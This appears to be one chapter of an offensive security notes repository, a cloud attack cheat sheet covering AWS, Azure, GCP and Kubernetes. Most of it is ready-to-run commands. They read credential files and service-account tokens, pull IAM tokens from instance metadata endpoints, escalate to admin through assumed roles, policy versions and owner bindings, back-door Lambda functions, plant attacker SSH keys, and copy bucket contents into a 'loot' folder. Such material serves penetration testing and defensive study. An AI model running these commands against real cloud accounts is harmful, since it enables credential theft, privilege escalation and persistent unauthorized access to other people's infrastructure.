# 11 – Cloud Security

## Philosophy

Cloud environments change the traditional attack model.

Instead of attacking servers directly, the focus shifts to:

* **Identity and access management (IAM)**
* **Cloud APIs**
* **Misconfigured storage**
* **Overprivileged roles**

In cloud infrastructure, **identity becomes the new perimeter**.

A single leaked credential can allow attackers to:

* Enumerate cloud resources
* Escalate privileges
* Access storage
* Deploy malicious compute
* Achieve full cloud compromise

---

# Cloud Attack Surface

| Area             | Target                             |
| ---------------- | ---------------------------------- |
| Credentials      | API keys, tokens, service accounts |
| IAM Policies     | Overprivileged roles               |
| Storage          | Public buckets, exposed blobs      |
| Compute          | EC2, Azure VMs, GCP instances      |
| Serverless       | Lambda, Azure Functions            |
| Containers       | Kubernetes clusters                |
| APIs             | Cloud management endpoints         |
| Metadata Service | Instance credential retrieval      |

---

# Cloud Attack Workflow

```text
Credential Discovery
        │
        ▼
Cloud Enumeration
        │
        ▼
Privilege Escalation
        │
        ▼
Resource Exploitation
        │
        ▼
Persistence
```

---

# Credential Discovery

Credentials are commonly stored in:

* environment variables
* config files
* container images
* metadata services

### Environment Variables

```bash
env | grep -i aws
env | grep -i azure
env | grep -i google
```

---

### Credential Files

AWS:

```bash
cat ~/.aws/credentials
cat ~/.aws/config
```

Azure:

```bash
cat ~/.azure/azureProfile.json
cat ~/.azure/accessTokens.json
```

GCP:

```bash
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db
```

---

### Docker Containers

```bash
cat /root/.aws/credentials
```

---

### Cloud Metadata Service

Common target when inside cloud VM.

AWS:

```bash
curl http://169.254.169.254/latest/meta-data/
```

IAM Role Credentials:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

# AWS Enumeration

### Identify Current Identity

```bash
aws sts get-caller-identity
aws iam get-user
```

---

### List Resources

```bash
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws lambda list-functions --region us-east-1
aws iam list-users
aws iam list-roles
aws iam list-policies
```

---

### Inspect Bucket Permissions

```bash
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-policy --bucket target-bucket
```

---

### Download Bucket Contents

```bash
aws s3 sync s3://target-bucket ./downloaded/
```

---

# Azure Enumeration

### Authentication

```bash
az login
az account show
az account list
```

---

### Resource Discovery

```bash
az vm list --output table
az storage account list
az keyvault list
```

---

### IAM Permissions

```bash
az role assignment list --assignee user@domain.com
```

---

### Storage Access

```bash
az storage container list --account-name targetaccount
az storage blob list --container-name secrets --account-name targetaccount
```

Download file:

```bash
az storage blob download \
  --container-name secrets \
  --name secret.txt \
  --file secret.txt
```

---

### Azure AD Enumeration

```bash
az ad user list
az ad group list
az ad sp list
```

---

# GCP Enumeration

### Authentication

```bash
gcloud auth login
gcloud config list
```

---

### Projects

```bash
gcloud projects list
```

---

### Compute Resources

```bash
gcloud compute instances list
```

---

### Storage

```bash
gcloud storage ls
```

or

```bash
gsutil ls
```

Download files:

```bash
gsutil cp gs://target-bucket/secret.txt .
```

---

# Cloud Privilege Escalation

## AWS

### Assume IAM Role

```bash
aws sts assume-role \
--role-arn arn:aws:iam::123456789012:role/AdminRole \
--role-session-name attacker
```

Use credentials returned from the response.

---

### Create Admin Policy Version

If `iam:CreatePolicyVersion` is allowed:

```bash
aws iam create-policy-version \
--policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
--policy-document file://admin.json \
--set-as-default
```

---

### Launch EC2 with Privileged Role

```bash
aws ec2 run-instances \
--image-id ami-0abcdef1234567890 \
--instance-type t2.micro \
--iam-instance-profile Name=AdminRole
```

Then extract credentials via metadata service.

---

## Azure

If attacker has **Contributor access**:

```bash
az vm run-command invoke \
--resource-group RG \
--name VMName \
--command-id RunPowerShellScript \
--scripts "curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com -H Metadata:true"
```

---

## GCP

Add attacker as project owner:

```bash
gcloud projects add-iam-policy-binding project-id \
--member=user:attacker@example.com \
--role=roles/owner
```

---

# Storage Exploitation

### Public AWS S3 Bucket

List contents anonymously:

```bash
aws s3 ls s3://company-backups --no-sign-request
```

Upload file if writeable:

```bash
echo "malicious" > test.txt
aws s3 cp test.txt s3://company-backups/ --no-sign-request
```

---

### Azure Public Blob Container

```bash
az storage blob list \
--container-name public \
--account-name targetaccount \
--auth-mode anonymous
```

---

# Metadata Service Attacks

## AWS

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```

Export credentials:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

---

## Azure

```bash
curl \
'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' \
-H Metadata:true
```

---

## GCP

```bash
curl -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

---

# Kubernetes Enumeration

If inside a pod:

```bash
kubectl get pods
kubectl get secrets
kubectl get configmaps
```

Check permissions:

```bash
kubectl auth can-i create pod
kubectl auth can-i list secrets --all-namespaces
```

Service account token:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

# Serverless Backdoors

Example AWS Lambda modification:

```bash
aws lambda update-function-code \
--function-name my-function \
--zip-file fileb://backdoor.zip
```

---

# Persistence

### Add SSH Keys to GCP Project

```bash
gcloud compute project-info add-metadata \
--metadata ssh-keys="attacker:ssh-rsa AAA..."
```

---

# Automation

## Cloud Enumeration Script

```bash
#!/bin/bash

# AWS
if command -v aws &> /dev/null; then
    aws sts get-caller-identity > aws_identity.txt
    aws iam list-users > aws_users.txt
    aws s3 ls > aws_buckets.txt
fi

# Azure
if command -v az &> /dev/null; then
    az account show > azure_account.txt
    az vm list --output table > azure_vms.txt
fi

# GCP
if command -v gcloud &> /dev/null; then
    gcloud projects list > gcp_projects.txt
    gcloud compute instances list > gcp_instances.txt
fi
```

---

# Cloud Security Scanning Tools

### ScoutSuite

Multi-cloud security auditing tool.

```bash
pip install scoutsuite
```

Run scans:

```bash
scout aws --access-keys
scout azure --cli
scout gcp --user-account
```

---

# Common Cloud Attack Chains

| Initial Access   | Result                                  |
| ---------------- | --------------------------------------- |
| Leaked AWS keys  | S3 bucket access → credentials → admin  |
| EC2 compromise   | Metadata service → IAM role credentials |
| Public S3 bucket | Sensitive data exposure                 |
| Kubernetes pod   | Service account → cluster admin         |

---

# Common Mistakes

### Ignoring metadata service

Many attackers forget this — **it's often the easiest credential source**.

---

### Not auditing IAM policies

Overprivileged roles are extremely common.

---

### Assuming cloud resources are private

Misconfigured storage frequently exposes sensitive data.

---

### Using outdated tools

Cloud APIs change frequently.

---

# Professional Tips

• Use **Nimbostratus** for AWS privilege escalation analysis
• Always check for **public storage buckets**
• Investigate **Azure Automation runbooks** for credentials
• Check **GCP Cloud Functions environment variables**

---

# Suggested Repository Structure

```text
11-Cloud-Security
├── README.md
├── providers
│   ├── aws
│   │   ├── credentials.txt
│   │   ├── iam_policies.txt
│   │   ├── s3_buckets.txt
│   │   └── ec2_instances.txt
│   ├── azure
│   │   ├── subscriptions.txt
│   │   ├── role_assignments.txt
│   │   ├── storage_accounts.txt
│   │   └── vms.txt
│   └── gcp
│       ├── projects.txt
│       ├── service_accounts.txt
│       ├── buckets.txt
│       └── instances.txt
├── loot
│   ├── bucket_contents
│   └── credentials_dump.txt
└── attack_paths.txt
```
